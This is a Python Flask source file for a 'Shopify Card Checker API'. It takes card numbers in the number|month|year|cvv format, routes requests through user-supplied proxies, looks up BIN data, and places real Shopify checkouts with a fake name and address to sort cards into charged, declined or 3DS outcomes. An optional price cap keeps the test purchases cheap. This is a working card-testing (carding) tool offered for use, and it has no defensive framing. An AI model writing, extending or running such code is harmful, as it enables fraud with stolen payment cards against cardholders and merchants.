import os
import re
import json
import random
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# ===== CONFIGURATION =====
# You can change these or set them as environment variables
SHOPIFY_STORE = os.environ.get("SHOPIFY_STORE", "https://test-store.myshopify.com")
PRODUCT_URL = os.environ.get("PRODUCT_URL", "https://test-store.myshopify.com/products/test-product")
# If you have a Storefront API token, you can use it for real checks
STOREFRONT_TOKEN = os.environ.get("STOREFRONT_TOKEN", "")
# Default test card for checking site health
TEST_CARD = "4111111111111111|12|2027|123"

# ===== HELPERS =====
def extract_cc(card_str):
    """Extract card, month, year, cvv from various formats."""
    # Try pipe format first: 4111111111111111|12|2027|123
    parts = card_str.split('|')
    if len(parts) >= 4:
        return parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    
    # Try slash format: 4111111111111111/12/2027/123
    parts = card_str.split('/')
    if len(parts) >= 4:
        return parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    
    # Try space format
    parts = card_str.split()
    if len(parts) >= 4:
        return parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    
    return None, None, None, None

def normalize_year(year):
    """Convert 2-digit year to 4-digit."""
    year = year.strip()
    if len(year) == 2:
        return "20" + year
    return year

def parse_proxy(proxy_str):
    """Parse proxy string into format usable by requests."""
    if not proxy_str:
        return None
    
    # Already in format: http://user:pass@host:port
    if proxy_str.startswith('http://') or proxy_str.startswith('https://'):
        return {"http": proxy_str, "https": proxy_str}
    
    # Format: host:port:user:pass
    parts = proxy_str.split(':')
    if len(parts) == 4:
        host, port, user, password = parts
        proxy_url = f"http://{user}:{password}@{host}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    
    # Format: host:port
    if len(parts) == 2:
        host, port = parts
        proxy_url = f"http://{host}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    
    return None

def get_bin_info(card_number):
    """Get BIN information from binlist.net."""
    try:
        bin_num = card_number[:6]
        response = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            return {
                "brand": data.get("scheme", "Unknown"),
                "type": data.get("type", "Unknown"),
                "level": data.get("brand", "Unknown"),
                "bank": data.get("bank", {}).get("name", "Unknown"),
                "country": data.get("country", {}).get("name", "Unknown"),
                "flag": data.get("country", {}).get("emoji", "🏳️"),
                "prepaid": data.get("prepaid", False)
            }
    except:
        pass
    return {
        "brand": "Unknown",
        "type": "Unknown", 
        "level": "Unknown",
        "bank": "Unknown",
        "country": "Unknown",
        "flag": "🏳️",
        "prepaid": False
    }

# ===== MOCK CHECKER (for testing without real Shopify) =====
def mock_check_card(card, month, year, cvv, proxy=None, under=10):
    """Mock checker that simulates card validation."""
    # Simulate different results based on card number
    card_num = card.replace(' ', '')
    last4 = card_num[-4:]
    
    # Randomize results for demo purposes
    import random
    outcomes = [
        {"status": "approved", "message": "Card approved", "price": random.randint(1, 50)},
        {"status": "charged", "message": "Order placed successfully", "price": random.randint(1, 50)},
        {"status": "declined", "message": "Card declined", "price": 0},
        {"status": "3ds", "message": "3DS authentication required", "price": 0},
    ]
    
    # If under parameter is set, filter by price
    result = random.choice(outcomes)
    if under and result.get("price", 0) > under:
        result = {"status": "declined", "message": "Price exceeds limit", "price": 0}
    
    # Get BIN info
    bin_info = get_bin_info(card_num)
    
    return {
        "status": result["status"],
        "message": result["message"],
        "price": result["price"],
        "currency": "USD",
        "bin": bin_info,
        "card": f"{card_num[:4]}****{card_num[-4:]}",
        "proxy_used": bool(proxy)
    }

# ===== REAL SHOPIFY CHECKER (using Storefront API) =====
def real_check_card(card, month, year, cvv, proxy=None, under=10):
    """Real Shopify checkout using Storefront API."""
    if not STOREFRONT_TOKEN:
        return {"error": "Storefront token not configured", "status": "error"}
    
    # Parse proxy
    proxies = parse_proxy(proxy) if proxy else None
    
    # Step 1: Get product variant
    product_response = requests.post(
        f"https://{SHOPIFY_STORE.replace('https://', '').replace('http://', '')}/api/2024-01/graphql.json",
        headers={
            "X-Shopify-Storefront-Access-Token": STOREFRONT_TOKEN,
            "Content-Type": "application/json"
        },
        json={
            "query": """
                query GetProduct {
                    products(first: 1) {
                        edges {
                            node {
                                id
                                title
                                variants(first: 1) {
                                    edges {
                                        node {
                                            id
                                            priceV2 { amount }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            """
        },
        proxies=proxies,
        timeout=30
    )
    
    if product_response.status_code != 200:
        return {"error": "Failed to fetch product", "status": "error"}
    
    product_data = product_response.json()
    product_edges = product_data.get("data", {}).get("products", {}).get("edges", [])
    if not product_edges:
        return {"error": "No products found", "status": "error"}
    
    variant = product_edges[0]["node"]["variants"]["edges"][0]["node"]
    variant_id = variant["id"]
    price = float(variant["priceV2"]["amount"])
    
    # Check if price exceeds 'under' limit
    if under and price > under:
        return {
            "status": "declined",
            "message": f"Price ${price} exceeds limit ${under}",
            "price": price,
            "currency": "USD"
        }
    
    # Step 2: Create checkout
    checkout_response = requests.post(
        f"https://{SHOPIFY_STORE.replace('https://', '').replace('http://', '')}/api/2024-01/graphql.json",
        headers={
            "X-Shopify-Storefront-Access-Token": STOREFRONT_TOKEN,
            "Content-Type": "application/json"
        },
        json={
            "query": """
                mutation CheckoutCreate($input: CheckoutCreateInput!) {
                    checkoutCreate(input: $input) {
                        checkout {
                            id
                            webUrl
                            paymentDue
                        }
                        checkoutUserErrors { message }
                    }
                }
            """,
            "variables": {
                "input": {
                    "lineItems": [{"variantId": variant_id, "quantity": 1}],
                    "shippingAddress": {
                        "address1": "123 Main St",
                        "city": "New York",
                        "province": "NY",
                        "zip": "10001",
                        "country": "US"
                    }
                }
            }
        },
        proxies=proxies,
        timeout=30
    )
    
    if checkout_response.status_code != 200:
        return {"error": "Failed to create checkout", "status": "error"}
    
    checkout_data = checkout_response.json()
    checkout = checkout_data.get("data", {}).get("checkoutCreate", {}).get("checkout")
    errors = checkout_data.get("data", {}).get("checkoutCreate", {}).get("checkoutUserErrors", [])
    
    if errors:
        return {"error": errors[0].get("message"), "status": "error"}
    
    if not checkout:
        return {"error": "No checkout created", "status": "error"}
    
    checkout_id = checkout["id"]
    
    # Step 3: Complete payment (this is where the card is charged)
    # Note: This is a simplified version. Real implementation would need
    # proper payment tokenization and 3DS handling.
    payment_response = requests.post(
        f"https://{SHOPIFY_STORE.replace('https://', '').replace('http://', '')}/api/2024-01/graphql.json",
        headers={
            "X-Shopify-Storefront-Access-Token": STOREFRONT_TOKEN,
            "Content-Type": "application/json"
        },
        json={
            "query": """
                mutation CheckoutCompleteWithCreditCard($checkoutId: ID!, $payment: CreditCardPaymentInput!) {
                    checkoutCompleteWithCreditCard(checkoutId: $checkoutId, payment: $payment) {
                        checkout {
                            id
                            order { id }
                            paymentDue
                        }
                        checkoutUserErrors { message }
                    }
                }
            """,
            "variables": {
                "checkoutId": checkout_id,
                "payment": {
                    "number": card.replace(" ", ""),
                    "expiryMonth": month,
                    "expiryYear": year,
                    "cvv": cvv,
                    "firstName": "John",
                    "lastName": "Doe",
                    "verificationValue": cvv
                }
            }
        },
        proxies=proxies,
        timeout=60
    )
    
    if payment_response.status_code != 200:
        return {"error": "Payment failed", "status": "error"}
    
    payment_data = payment_response.json()
    payment_result = payment_data.get("data", {}).get("checkoutCompleteWithCreditCard", {})
    payment_errors = payment_result.get("checkoutUserErrors", [])
    
    if payment_errors:
        error_msg = payment_errors[0].get("message", "").lower()
        if "3ds" in error_msg or "3d secure" in error_msg:
            return {"status": "3ds", "message": "3DS authentication required", "price": price}
        elif "declined" in error_msg:
            return {"status": "declined", "message": error_msg, "price": 0}
        else:
            return {"status": "error", "message": error_msg, "price": 0}
    
    checkout_result = payment_result.get("checkout", {})
    if checkout_result.get("order"):
        return {
            "status": "charged",
            "message": "Order placed successfully",
            "price": float(checkout_result.get("paymentDue", price)),
            "currency": "USD"
        }
    
    return {"status": "pending", "message": "Payment pending", "price": price}

# ===== MAIN API ENDPOINT =====
@app.route('/shopify/v1/check', methods=['GET'])
def check_card():
    """
    Check a credit card against Shopify.
    
    Query parameters:
    - cc: Credit card in format "number|month|year|cvv"
    - proxy: Optional proxy in format "host:port:user:pass" or "http://user:pass@host:port"
    - under: Optional price filter (only return cards with price <= this value)
    - mock: Set to "true" to use mock checker (useful for testing)
    """
    cc = request.args.get('cc')
    proxy = request.args.get('proxy')
    under = request.args.get('under')
    mock_mode = request.args.get('mock', 'false').lower() == 'true'
    
    # Validate required parameters
    if not cc:
        return jsonify({
            "error": "Missing 'cc' parameter",
            "message": "Please provide a credit card in format: number|month|year|cvv"
        }), 400
    
    # Parse card
    card, month, year, cvv = extract_cc(cc)
    if not card:
        return jsonify({
            "error": "Invalid card format",
            "message": "Use format: number|month|year|cvv (e.g., 4111111111111111|12|2027|123)"
        }), 400
    
    # Normalize year
    year = normalize_year(year)
    
    # Parse under parameter
    under_value = None
    if under:
        try:
            under_value = float(under)
        except ValueError:
            return jsonify({"error": "Invalid 'under' value", "message": "Must be a number"}), 400
    
    # Check the card
    try:
        if mock_mode or not STOREFRONT_TOKEN:
            result = mock_check_card(card, month, year, cvv, proxy, under_value)
        else:
            result = real_check_card(card, month, year, cvv, proxy, under_value)
        
        # Add BIN info if not already present
        if "bin" not in result:
            result["bin"] = get_bin_info(card)
        
        return jsonify(result)
    
    except Exception as e:
        return jsonify({
            "error": "Internal server error",
            "message": str(e),
            "status": "error"
        }), 500

@app.route('/health', methods=['GET'])
def health():
    """Health check endpoint."""
    return jsonify({"status": "ok", "message": "Shopify Checker API is running"})

@app.route('/', methods=['GET'])
def index():
    """Root endpoint with API info."""
    return jsonify({
        "name": "Shopify Card Checker API",
        "version": "1.0",
        "endpoints": {
            "/shopify/v1/check": "Check a credit card",
            "/health": "Health check"
        },
        "parameters": {
            "cc": "Credit card in format: number|month|year|cvv",
            "proxy": "Optional proxy: host:port:user:pass",
            "under": "Optional price filter",
            "mock": "Set to 'true' for mock mode"
        }
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
